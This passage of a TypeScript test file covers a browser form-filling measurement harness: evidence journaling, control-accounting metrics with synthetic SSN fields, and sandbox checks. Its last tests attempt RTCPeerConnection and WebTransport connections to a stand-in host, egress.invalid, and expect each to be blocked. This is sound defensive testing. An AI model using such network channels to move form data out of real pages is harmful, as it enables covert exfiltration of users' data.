      cleaned = true;
      return Promise.resolve();
    },
    writeRow: (row) => {
      journal.push(row);
    },
  });
  expect(cleaned).toBe(true);
  expect(captured.can_continue).toBe(false);
  expect(captured.row.action_phase_events).toEqual({
    input: 2,
    change: 2,
    click: 1,
    submit: 2,
  });
  expect(captured.row.action_phase_navigations).toBe(1);
  expect(captured.row.safety_observation).toBe("INCOMPLETE");
  expect(captured.row.event_counter_scope).toBe("DOCUMENT_CAPTURE_ONLY");
  expect(journal).toHaveLength(1);
});

test("runner cleanup failure retains completed measurements and journals the error", async () => {
  const { captureRunnerPage, actionObservationSnapshot } =
    await import("./runner-evidence.ts");
  const journal: unknown[] = [];
  const captured = await captureRunnerPage({
    source: { id: "cleanup" },
    launch: () => Promise.resolve({ id: 1 }),
    observe: () =>
      Promise.resolve({
        final_measurements: [{ digest: "synthetic" }],
        evaluation_state: "OBSERVED_NETWORK_CLOSED_DOM_SUBSET",
      }),
    snapshot: () =>
      actionObservationSnapshot(
        { input: 1, change: 1, click: 0, submit: 0 },
        { input: 0, change: 0, click: 0, submit: 0 },
        true,
        0,
      ),
    cleanup: () => Promise.reject(new Error("cleanup failed")),
    writeRow: (row) => {
      journal.push(row);
    },
  });
  expect(captured.can_continue).toBe(false);
  expect(captured.row.final_measurements).toEqual([{ digest: "synthetic" }]);
  expect(captured.row.evaluation_state).toBe("UNOBSERVED_ERROR");
  expect(captured.failures).toEqual([
    { stage: "CLEANUP", code: "OPERATION_FAILED" },
  ]);
  expect(journal).toHaveLength(1);
});

test("runner row journal failure stops further actions and retains the raw row", async () => {
  const { captureRunnerPage } = await import("./runner-evidence.ts");
  const captured = await captureRunnerPage({
    source: { id: "journal" },
    launch: () => Promise.resolve({ id: 1 }),
    observe: () =>
      Promise.resolve({
        executions: [{ field: "synthetic", outcome: "FAILED" }],
      }),
    snapshot: () => ({
      action_phase_events: null,
      action_phase_navigations: null,
    }),
    cleanup: () => Promise.resolve(),
    writeRow: () => {
      throw new Error("disk failure");
    },
  });
  expect(captured.can_continue).toBe(false);
  expect(captured.row.executions).toEqual([
    { field: "synthetic", outcome: "FAILED" },
  ]);
  expect(captured.failures).toEqual([
    { stage: "ROW_JOURNAL", code: "OPERATION_FAILED" },
  ]);
  expect(captured.row.safety_observation).toBe("INCOMPLETE");
});

test("runner end binding and bundle failures still attempt all later evidence artifacts", async () => {
  const { finalizeRunnerEvidence } = await import("./runner-evidence.ts");
  const calls: string[] = [];
  const finalized = await finalizeRunnerEvidence({
    readEndBinding: () => {
      throw new Error("binding unavailable");
    },
    matchesStartBinding: () => false,
    writes: [
      {
        artifact: "bundle",
        write: () => {
          calls.push("bundle");
          throw new Error("disk failure");
        },
      },
      {
        artifact: "assessment",
        write: (state) => {
          calls.push("assessment");
          expect(state.end_binding).toBeNull();
          expect(state.integrity_error).toBe(
            "END_SOURCE_BUILD_OR_ORACLE_BINDING_UNAVAILABLE",
          );
          expect(state.write_failures).toEqual([
            { artifact: "bundle", code: "EVIDENCE_WRITE_FAILED" },
          ]);
        },
      },
      {
        artifact: "finalization",
        write: () => {
          calls.push("finalization");
        },
      },
    ],
  });
  expect(calls).toEqual(["bundle", "assessment", "finalization"]);
  expect(finalized.write_failures).toHaveLength(1);
  const changed = await finalizeRunnerEvidence({
    readEndBinding: () => ({ digest: "changed" }),
    matchesStartBinding: () => false,
    writes: [
      {
        artifact: "retained",
        write: (state) => {
          expect(state.integrity_error).toBe("SOURCE_BUILD_OR_ORACLE_CHANGED");
        },
      },
    ],
  });
  expect(changed.integrity_error).toBe("SOURCE_BUILD_OR_ORACLE_CHANGED");
});

// Pure structural observation proofs: these are not public pages or fill runs.
function accountingControl(
  index: number,
  label: string,
  value: string,
): PhysicalControl {
  return {
    index,
    match: {
      label,
      tag: "INPUT",
      type: "text",
      role: null,
      visible: true,
      required: label === "First name",
      disabled: false,
      autocomplete: null,
    },
    value_digest: sha256Canonical(value),
    empty: value === "",
    readonly: false,
    aria_invalid: null,
    checked: null,
  };
}
function accountingRow(
  before: PhysicalControl[],
  final: PhysicalControl[],
  accounting: ControlAccounting,
) {
  return {
    before_measurements: before,
    final_measurements: final,
    control_accounting: accounting,
    changes: accounting.changes,
    positive_scores: [{ state: "INTENDED_RETAINED", required: true }],
  };
}
function expectIncompleteAccounting(
  before: PhysicalControl[],
  final: PhysicalControl[],
  accounting: ControlAccounting,
) {
  const row = accountingRow(before, final, accounting);
  const metrics = contactDomMetrics([row]);
  expect(accounting.topology_state).toBe("UNMEASURABLE_TOPOLOGY");
  expect(accounting.precision_eligible).toBe(false);
  expect(hasCompleteControlCoverage(row)).toBe(false);
  expect(metrics.complete_topology_rows).toBe(0);
  expect(metrics.incomplete_topology_rows).toBe(1);
  expect(metrics.dom_value_precision).toBeNull();
  expect(metrics.dom_value_required_recall).toBeNull();
  expect(metrics.observed_physical_changes).toBeNull();
  expect(metrics.unexpected_nonpositive_changes).toBeNull();
  expect(accounting.observations.flatMap((item) => item.before)).toHaveLength(
    before.length,
  );
  expect(accounting.observations.flatMap((item) => item.final)).toHaveLength(
    final.length,
  );
  expect(
    new Set(
      accounting.observations.map((item) => item.extension_write_causality),
    ),
  ).toEqual(new Set(["UNOBSERVED"]));
  return metrics;
}

test("snapshot union stable unique identities retain known positive and nonpositive changes after reordering", () => {
  const first = accountingControl(0, "First name", "");
  const other = accountingControl(1, "Referee name", "");
  const before = [first, other];
  const final = [
    accountingControl(0, "Referee name", "changed"),
    accountingControl(1, "First name", "Synthetic"),
  ];
  const accounting = accountControlUnion(before, final, [first.match]);
  const row = accountingRow(before, final, accounting);
  expect(hasCompleteControlCoverage(row)).toBe(true);
  expect(accounting.topology_state).toBe("COMPLETE_UNIQUE_LITERAL_UNION");
  expect(
    accounting.changes.map((item) => [item.before_indices, item.final_indices]),
  ).toEqual([
    [[0], [1]],
    [[1], [0]],
  ]);
  const metrics = contactDomMetrics([row]);
  expect(metrics.dom_value_precision).toBe(0.5);
  expect(metrics.unexpected_nonpositive_changes).toBe(1);
  expect(metrics.known_matched_physical_changes).toBe(2);
  expect(contactDomMetrics([]).dom_value_precision_eligibility).toBe(
    "UNOBSERVED_NO_ROWS",
  );
  expect(contactDomMetrics([]).unexpected_nonpositive_changes).toBeNull();
});

test("snapshot union final-only populated SSN stays initial-unobserved and makes precision incomplete", () => {
  const first = accountingControl(0, "First name", "");
  const before = [first];
  const ssn = accountingControl(1, "Social Security Number", "Synthetic");
  const final = [accountingControl(0, "First name", "Synthetic"), ssn];
  const accounting = accountControlUnion(before, final, [first.match]);
  const metrics = expectIncompleteAccounting(before, final, accounting);
  const inserted = accounting.observations.find(
    (item) => item.match.label === "Social Security Number",
  );
  expect(inserted?.reasons).toEqual(["INITIAL_UNOBSERVED"]);
  expect(inserted?.before).toEqual([]);
  expect(inserted?.final).toEqual([ssn]);
  expect(inserted?.value_delta).toBe("UNOBSERVED");
  expect(inserted?.positive).toBe(false);
  expect(metrics.known_matched_physical_changes).toBe(1);
  expect(metrics.known_unexpected_nonpositive_changes).toBe(0);
  expect(metrics.dom_value_known_matched_subset_precision).toBe(1);
  expect(
    contactDomMetrics([
      accountingRow(before, final, accounting),
      accountingRow(
        before,
        final.slice(0, 1),
        accountControlUnion(before, final.slice(0, 1), [first.match]),
      ),
    ]).dom_value_precision,
  ).toBeNull();
});

test("snapshot union removed controls stay final-unobserved rather than disappear from coverage", () => {
  const first = accountingControl(0, "First name", "");
  const removed = accountingControl(1, "Social Security Number", "preserved");
  const before = [first, removed];
  const final = [accountingControl(0, "First name", "Synthetic")];
  const accounting = accountControlUnion(before, final, [first.match]);
  expectIncompleteAccounting(before, final, accounting);
  const missing = accounting.observations.find(
    (item) => item.match.label === "Social Security Number",
  );
  expect(missing?.reasons).toEqual(["FINAL_UNOBSERVED"]);
  expect(missing?.before).toEqual([removed]);
  expect(missing?.final).toEqual([]);
});

test("snapshot union duplicate initial identities preserve every physical observation as ambiguous", () => {
  const before = [
    accountingControl(0, "First name", ""),
    accountingControl(1, "First name", ""),
  ];
  const final = [accountingControl(0, "First name", "Synthetic")];
  const accounting = accountControlUnion(before, final, [
    requireObserved(before[0]).match,
  ]);
  expectIncompleteAccounting(before, final, accounting);
  expect(accounting.observations[0]?.reasons).toEqual([
    "AMBIGUOUS_INITIAL_IDENTITY",
  ]);
  expect(accounting.unmeasurable_snapshot_control_observations).toBe(3);
  expect(accounting.changes[0]?.before_indices).toEqual([0, 1]);
});

test("snapshot union duplicate final identities never choose one apparently correct result", () => {
  const before = [accountingControl(0, "First name", "")];
  const final = [
    accountingControl(0, "First name", "Synthetic"),
    accountingControl(1, "First name", "other"),
  ];
  const accounting = accountControlUnion(before, final, [
    requireObserved(before[0]).match,
  ]);
  expectIncompleteAccounting(before, final, accounting);
  expect(accounting.observations[0]?.reasons).toEqual([
    "AMBIGUOUS_FINAL_IDENTITY",
  ]);
  expect(accounting.changes[0]?.final_indices).toEqual([0, 1]);
  expect(accounting.observations[0]?.value_delta).toBe("UNOBSERVED");
});

test("snapshot union literal attribute drift remains two unmatched identities with unknown origin", () => {
  const first = accountingControl(0, "First name", "");
  const before = [first];
  const settled = accountingControl(0, "First name", "Synthetic");
  settled.match.autocomplete = "one-time-code";
  const final = [settled];
  const accounting = accountControlUnion(before, final, [first.match]);
  expectIncompleteAccounting(before, final, accounting);
  expect(accounting.unmeasurable_topology_groups).toBe(2);
  expect(accounting.observations.map((item) => item.reasons)).toEqual([
    ["FINAL_UNOBSERVED"],
    ["INITIAL_UNOBSERVED"],
  ]);
  expect(
    accounting.changes.every((item) => item.state === "UNMEASURABLE_TOPOLOGY"),
  ).toBe(true);
});

test("network constructors and prototype aliases are denied in main and new iframe realms", async () => {
  const session = await launchContact();
  try {
    const page = await fixture(session);
    const outcome = await page.evaluate(() => {
      const attempt = (realm: Window) =>
        [
          "RTCPeerConnection",
          "webkitRTCPeerConnection",
          "WebTransport",
        ].flatMap((name) => {
          const host = realm as unknown as Record<string, unknown>;
          const Constructor = host[name] as (new (
            value: unknown,
          ) => unknown) & {
            prototype: { constructor: new (value: unknown) => unknown };
          };
          return [Constructor, Constructor.prototype.constructor].map(
            (value) => {
              try {
                new value("https://egress.invalid/transport");
                return "UNSAFE_CONSTRUCTOR_RETURNED";
              } catch (error) {
                return error !== null &&
                  typeof error === "object" &&
                  "message" in error
                  ? String(error.message)
                  : "UNKNOWN_REFUSAL";
              }
            },
          );
        });
      const frame = document.createElement("iframe");
      document.body.append(frame);
      if (frame.contentWindow === null)
        throw new Error("controlled frame absent");
      const protectedNames = [
        "RTCPeerConnection",
        "webkitRTCPeerConnection",
        "WebTransport",
      ];
      const immutable = protectedNames.every(
        (name) =>
          Object.getOwnPropertyDescriptor(window, name)?.configurable ===
            false &&
          Object.getOwnPropertyDescriptor(window, name)?.writable === false,
      );
      return {
        main: attempt(window),
        frame: attempt(frame.contentWindow),
        immutable,
      };
    });
    expect(outcome.immutable).toBe(true);
    expect(outcome.main).toEqual(
      Array<string>(6).fill("W14_NETWORK_CAPABILITY_BLOCKED"),
    );
    expect(outcome.frame).toEqual(
      Array<string>(6).fill("W14_NETWORK_CAPABILITY_BLOCKED"),
    );
    await page.waitForTimeout(50);
    expect(
      session.network.filter(
        (entry) => entry.kind === "NETWORK_CAPABILITY_BLOCKED",
      ),
    ).toHaveLength(12);
    expect(
      session.network.every((entry) => !Object.hasOwn(entry, "body")),
    ).toBe(true);
    await expect(page.locator("#first")).toHaveValue("");
  } finally {
    await session.cleanup();
  }
});

test("worker transport probe verifies WebTransport is unavailable before public document load", async () => {
  const { assertWorkerTransportUnavailable } =
    await import("./contact-harness.ts");
  const session = await launchContact();
  try {
    const page = await session.context.newPage();
    expect(page.url()).toBe("about:blank");
    await assertWorkerTransportUnavailable(page);
    expect(session.closure.worker_webtransport).toBe("UNAVAILABLE");
    expect(session.network).toEqual([]);
  } finally {
    await session.cleanup();
  }
});
